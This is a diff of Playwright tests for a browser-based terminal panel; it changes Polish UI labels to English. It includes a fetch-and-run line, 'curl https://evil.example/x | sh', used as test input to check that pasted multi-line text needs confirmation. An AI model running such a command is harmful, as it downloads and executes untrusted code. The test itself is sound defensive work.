@@ -75,7 +75,7 @@ test('several terminals can be opened, switched and closed', async ({ page, requ
   await typeInTerminal(page, 'echo pierwszy');
   await expectTerminalToContain(page, 'pierwszy');
 
-  await page.getByRole('button', { name: '+ Nowy' }).click();
+  await page.getByRole('button', { name: 'New terminal' }).click();
   await expect(tabs(page)).toHaveText(['projects', 'projects (2)']);
   await expect(activeTerminal(page).locator('.xterm-rows')).toBeVisible();
   await expect.poll(() => terminalText(page)).not.toContain('pierwszy');
@@ -84,11 +84,11 @@ test('several terminals can be opened, switched and closed', async ({ page, requ
   await expectTerminalToContain(page, 'pierwszy');
 
   page.once('dialog', (dialog) => dialog.dismiss());
-  await page.getByRole('button', { name: 'Zamknij terminal projects (2)' }).click();
+  await page.getByRole('button', { name: 'Close terminal projects (2)' }).click();
   await expect(tabs(page)).toHaveCount(2);
 
   page.once('dialog', (dialog) => dialog.accept());
-  await page.getByRole('button', { name: 'Zamknij terminal projects (2)' }).click();
+  await page.getByRole('button', { name: 'Close terminal projects (2)' }).click();
   await expect(tabs(page)).toHaveText(['projects']);
   expect((await mockState(request)).log.filter((l) => l.path === 'terminal-close')).toHaveLength(1);
 });
@@ -102,11 +102,11 @@ test('a terminal already closed in another tab closes there without an error', a
   await expect(tabs(other)).toHaveText(['projects']);
 
   page.once('dialog', (dialog) => dialog.accept());
-  await page.getByRole('button', { name: 'Zamknij terminal projects' }).click();
+  await page.getByRole('button', { name: 'Close terminal projects' }).click();
   await expect(tabs(page)).toHaveCount(0);
 
   other.once('dialog', (dialog) => dialog.accept());
-  await other.getByRole('button', { name: 'Zamknij terminal projects' }).click();
+  await other.getByRole('button', { name: 'Close terminal projects' }).click();
   await expect(tabs(other)).toHaveCount(0);
   await expect(other.locator('app-terminal-panel').getByRole('alert')).toHaveCount(0);
   expect((await mockState(request)).log.filter((l) => l.path === 'terminal-close')).toHaveLength(1);
@@ -115,18 +115,18 @@ test('a terminal already closed in another tab closes there without an error', a
 test('exit ends the shell and the tab closes without asking', async ({ page }) => {
   await openTerminalTab(page);
   await typeInTerminal(page, 'exit');
-  await expectTerminalToContain(page, '[proces zakończony]');
-  await expect(tabs(page)).toHaveText(['projects (zakończony)']);
+  await expectTerminalToContain(page, '[process exited]');
+  await expect(tabs(page)).toHaveText(['projects (exited)']);
 
   let asked = false;
   page.once('dialog', (dialog) => {
     asked = true;
     void dialog.dismiss();
   });
-  await page.getByRole('button', { name: 'Zamknij terminal projects' }).click();
+  await page.getByRole('button', { name: 'Close terminal projects' }).click();
   await expect(tabs(page)).toHaveCount(0);
   expect(asked).toBe(false);
-  await expect(page.locator('app-terminal-panel')).toContainText('Brak otwartych terminali.');
+  await expect(page.locator('app-terminal-panel')).toContainText('No open terminals.');
 });
 
 test('Ctrl+S inside the terminal goes to the shell, not to the editor', async ({ page, request }) => {
@@ -168,12 +168,12 @@ test('pasted text loses control characters, and text with line breaks waits for 
   expect(await terminalInputs(request)).not.toMatch(/[\x1b\x03]/);
   await page.keyboard.press('Control+c');
 
-  // Text with line breaks: a panel with a question, focus on "Anuluj" (Cancel), so Enter pastes nothing and does not reach the shell.
+  // Text with line breaks: a panel with a question, focus on "Cancel", so Enter pastes nothing and does not reach the shell.
   const question = activeTerminal(page).getByRole('alertdialog');
   await pasteIntoTerminal(page, 'echo x\r\ncurl https://evil.example/x | sh\n');
-  await expect(question).toContainText('Wklejany tekst ma 2 końce linii');
+  await expect(question).toContainText('The pasted text has 2 line breaks');
   await expect(question.locator('pre')).toContainText('curl https://evil.example/x | sh');
-  await expect(question.getByRole('button', { name: 'Anuluj' })).toBeFocused();
+  await expect(question.getByRole('button', { name: 'Cancel' })).toBeFocused();
   const before = await terminalInputs(request);
   await page.keyboard.press('Enter');
   await expect(question).toHaveCount(0);
@@ -184,13 +184,13 @@ test('pasted text loses control characters, and text with line breaks waits for 
   await pasteIntoTerminal(page, lines.join('\n') + '\n');
   const preview = question.locator('pre');
   await expect(preview).toContainText('echo linia 0');
-  await expect(preview).toContainText('⟨pominięto 12 linii⟩');
+  await expect(preview).toContainText('⟨12 lines omitted⟩');
   await expect(preview).toContainText('curl https://evil.example/x | sh');
-  await question.getByRole('button', { name: 'Anuluj' }).click();
+  await question.getByRole('button', { name: 'Cancel' }).click();
   expect(await terminalInputs(request)).toBe(before);
 
   await pasteIntoTerminal(page, 'echo pierwsza\necho druga\n');
-  await question.getByRole('button', { name: 'Wklej' }).click();
+  await question.getByRole('button', { name: 'Paste' }).click();
   await expect.poll(() => terminalText(page)).toMatch(/^pierwsza\s*$/m);
   await expect.poll(() => terminalText(page)).toMatch(/^druga\s*$/m);
   expect(dialogs).toBe(0);
@@ -202,11 +202,11 @@ test('keys typed while the connection is down arrive once and in order after it 
   await expect.poll(() => terminalText(page)).toMatch(/^przed\s*$/m);
 
   await setFault(request, { hubDownMs: 1500 });
-  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
+  await expect(page.locator('app-terminal-panel')).toContainText('disconnected');
   await page.keyboard.type('echo po-przerwie');
   await page.keyboard.press('Enter');
   await expect(activeTerminal(page).getByRole('status')).toHaveText(
-    'Brak połączenia. Wpisane znaki zostaną wysłane po ponownym połączeniu.'
+    'No connection. Typed characters will be sent after reconnecting.'
   );
   expect(await terminalInputs(request)).not.toContain('po-przerwie');
 
@@ -219,7 +219,7 @@ test('keys that waited long for the connection wait for a decision in the termin
   await openTerminalTab(page);
   await activeTerminal(page).locator('.xterm-screen').click();
   await setFault(request, { hubDownMs: 6000 });
-  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
+  await expect(page.locator('app-terminal-panel')).toContainText('disconnected');
   await page.keyboard.type('rm -rf build');
   let dialogs = 0;
   page.on('dialog', (dialog) => {
@@ -234,7 +234,7 @@ test('keys that waited long for the connection wait for a decision in the termin
   await expect(question).toContainText('rm -rf build dalej');
   expect(await terminalInputs(request)).toBe('');
 
-  await question.getByRole('button', { name: 'Porzuć' }).click();
+  await question.getByRole('button', { name: 'Discard' }).click();
   await expect(question).toHaveCount(0);
   await page.keyboard.type('echo nowa');
   await page.keyboard.press('Enter');
@@ -256,7 +256,7 @@ test('after a long outage only the characters that really did not arrive are off
   expect(await question.locator('pre').textContent()).toBe('cho raz\n'); // without the "e" that already arrived
   expect(await terminalInputs(request)).toBe('e');
 
-  await question.getByRole('button', { name: 'Wyślij' }).click();
+  await question.getByRole('button', { name: 'Send' }).click();
   await expect.poll(() => terminalText(page)).toMatch(/^raz\s*$/m);
   expect(await terminalInputs(request)).toBe('echo raz\r');
 });
@@ -271,7 +271,7 @@ test('a paste too long for the terminal is refused and the terminal keeps workin
     })
   );
   await pasteIntoTerminal(page, 'x'.repeat(70_000));
-  expect(await message).toContain('za długi');
+  expect(await message).toContain('too long');
   await typeInTerminal(page, 'echo dziala');
   await expect.poll(() => terminalText(page)).toMatch(/^dziala\s*$/m);
   expect(await terminalInputs(request)).toBe('echo dziala\r');
@@ -291,7 +291,7 @@ test('a batch whose confirmation was lost is not typed twice', async ({ page, re
 test('the terminal does not take the focus from the console while it connects', async ({ page, request }) => {
   await setFault(request, { attachDelayMs: 1500 });
   await page.getByRole('tab', { name: 'TERMINAL' }).click();
-  const prompt = page.getByRole('textbox', { name: 'Polecenie' });
+  const prompt = page.getByRole('textbox', { name: 'Prompt' });
   await prompt.click();
   await page.keyboard.type('pierwsza część ');
   await expectTerminalToContain(page, 'owner@dom:~/projekty$');
@@ -334,7 +334,7 @@ test('keys typed during an outage survive closing and reopening the terminal tab
   await openTerminalTab(page);
   await activeTerminal(page).locator('.xterm-screen').click();
   await setFault(request, { hubDownMs: 1500 });
-  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
+  await expect(page.locator('app-terminal-panel')).toContainText('disconnected');
   await page.keyboard.type('echo po-panelu');
   await page.keyboard.press('Enter');
 
@@ -349,11 +349,13 @@ test('when too much waits for the connection, further keys are refused until the
   await openTerminalTab(page);
   await activeTerminal(page).locator('.xterm-screen').click();
   await setFault(request, { hubDownMs: 1500 });
-  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
+  await expect(page.locator('app-terminal-panel')).toContainText('disconnected');
   const big = 'a'.repeat(40_000);
   await pasteIntoTerminal(page, `echo ${big}`);
   await pasteIntoTerminal(page, `echo ${big}`);
-  await expect(activeTerminal(page).getByRole('status')).toHaveText('Za dużo znaków czeka na wysłanie. Dalsze są pomijane, aż te dotrą.');
+  await expect(activeTerminal(page).getByRole('status')).toHaveText(
+    'Too many characters are waiting to be sent. Further ones are dropped until these arrive.'
+  );
   // The block also applies to small chunks: otherwise Enter would send a truncated command.
   await page.keyboard.type('x');
   await page.keyboard.press('Enter');
@@ -369,27 +371,27 @@ test('when too much waits for the connection, further keys are refused until the
   expect(inputs.match(/\r/g)).toHaveLength(1); // only the Enter from "echo ok"
 });
 
-test('when automatic reconnection gives up, "połącz ponownie" brings the terminal back with the waiting keys', async ({ page, request }) => {
+test('when automatic reconnection gives up, "reconnect" brings the terminal back with the waiting keys', async ({ page, request }) => {
   await page.clock.install(); // speeds up the successive SignalR connection attempts (0, 2, 5, 10, 20, 30 s)
   await page.reload(); // fake clock from the start of the page's life
   await openTerminalTab(page);
   await activeTerminal(page).locator('.xterm-screen').click();
   await setFault(request, { hubDownMs: 600_000 });
-  await expect(page.locator('app-terminal-panel')).toContainText('rozłączono');
+  await expect(page.locator('app-terminal-panel')).toContainText('disconnected');
   await page.keyboard.type('echo wrocilem');
   await page.keyboard.press('Enter');
   const panel = page.locator('app-terminal-panel');
   // Each attempt really connects (refused by the mock) and only then schedules the next one: we advance the clock until it works.
   await expect(async () => {
     await page.clock.fastForward('00:31');
-    await expect(panel.getByRole('alert')).toHaveText('Brak połączenia z terminalem.', { timeout: 300 });
+    await expect(panel.getByRole('alert')).toHaveText('No connection to the terminal.', { timeout: 300 });
   }).toPass({ timeout: 20_000 });
-  await expect(activeTerminal(page).getByRole('status')).toContainText('połącz ponownie');
+  await expect(activeTerminal(page).getByRole('status')).toContainText('reconnect');
 
   // The connection comes back, but the terminal list arrives late. A key pressed during that time
   // must not push out old characters without asking.
   await setFault(request, { hubDownMs: 0, listDelayMs: 1500 });
-  await panel.getByRole('button', { name: 'połącz ponownie' }).click();
+  await panel.getByRole('button', { name: 'reconnect' }).click();
   await activeTerminal(page).locator('.xterm-screen').click();
   await page.keyboard.type('x');
   const question = activeTerminal(page).getByRole('alertdialog');
@@ -397,7 +399,7 @@ test('when automatic reconnection gives up, "połącz ponownie" brings the termi
   await expect(question.locator('pre')).toContainText('x'); // the new key also waits in the question
   await page.waitForTimeout(1500);
   expect(await terminalInputs(request)).toBe('');
-  await question.getByRole('button', { name: 'Wyślij' }).click();
+  await question.getByRole('button', { name: 'Send' }).click();
   await expect.poll(() => terminalText(page)).toMatch(/^wrocilem\s*$/m);
   expect((await terminalInputs(request)).match(/echo wrocilem\r/g)).toHaveLength(1);
 });
